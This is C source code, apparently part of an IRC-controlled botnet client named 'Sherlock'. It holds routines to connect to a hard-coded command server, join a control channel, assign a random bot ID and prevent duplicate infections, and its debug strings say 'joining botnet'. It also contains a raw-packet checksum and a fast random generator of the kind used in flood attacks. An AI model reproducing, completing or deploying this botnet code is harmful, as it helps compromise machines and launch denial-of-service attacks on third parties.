#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>

#include "headers/includes.h"

int irc_connect(const char *server, int port) {
  struct sockaddr_in server_addr;
  struct hostent *host;

  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd == -1) {
    #ifdef DEBUG
        perror("[Sherlock/Debug] Error opening socket");
    #endif
    return -1;
  }

  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr(SERVER);
  server_addr.sin_port = htons(PORT);

  if (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) != 0) {
    #ifdef DEBUG
        perror("[Sherlock/Debug] Error connecting to socket");
    #endif
    return -1;
  }

  return sockfd;
}

void send_irc_command(int sockfd, const char *command) {
  char buffer[512];
  snprintf(buffer, sizeof(buffer), "%s\r\n", command);
  send(sockfd, buffer, strlen(buffer), 0);
}

void join_channel(int sockfd, const char *channel) {
  char join_command[512];
  snprintf(join_command, sizeof(join_command), "JOIN %s\r\n", channel);
  send_irc_command(sockfd, join_command);
  #ifdef DEBUG
    printf("[Sherlock/Debug] Joined %s channel\n", channel);
  #endif
}

void strip_string(char* str) {
  int len = strlen(str);
  int i, j = 0;

  for (i = 0; i < len; i++) {
    if (str[i] != '\n' && str[i] != '\r') {
      str[j] = str[i];
      j++;
    }
  }

  str[j] = '\0';
}

char compare_val(char *buf, int buf_len, char *data, int data_len)
{
  int i = 0;
  int j = 0;

  for(i = 0; i < buf_len; i++)
  {
    if(j == data_len)
    {
      break;
    }

    if(buf[i] == data[j])
    {
      j++;
      continue;
    }

    j = 0;
  }

  if(j != data_len)
  {
    return 0;
  }

  return 1;
}

unsigned short csum(unsigned short *buf, int count)
{
  register unsigned long sum = 0;
  while( count > 1 ) { sum += *buf++; count -= 2; }
  if(count > 0) { sum += *(unsigned char *)buf; }
  while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
  return (unsigned short)(~sum);
}

unsigned long int rand_cmwc(void)
{
  static unsigned long int Q[4096], c = 362436;
  unsigned long long int t, a = 18782LL;
  static unsigned long int i = 4095;
  unsigned long int x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (t >> 32);
  x = t + c;
  if (x < c) {
          x++;
          c++;
  }
  return (Q[i] = r - x);
}

char *generate_bot_id() {
  srand(time(NULL));
  int random_number = rand() % 90000 + 10000;
  char* result = malloc(6);
  sprintf(result, "%d", random_number);
  return result;
}

// Binds a socket to single instance port on loopback interface to solve bot duplication
int ensure_single_instance() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        #ifdef DEBUG
            printf("[Sherlock/Debug] Error creating socket for ESI port\n");
        #endif
        exit(1);
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(ESI_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        #ifdef DEBUG
            printf("[Sherlock/Debug] Another instance is already running\n");
        #endif
        close(sockfd);
        return 1;
    }

    #ifdef DEBUG
        printf("[Sherlock/Debug] No other instance detected, joining botnet\n");
    #endif
    return 0;
}
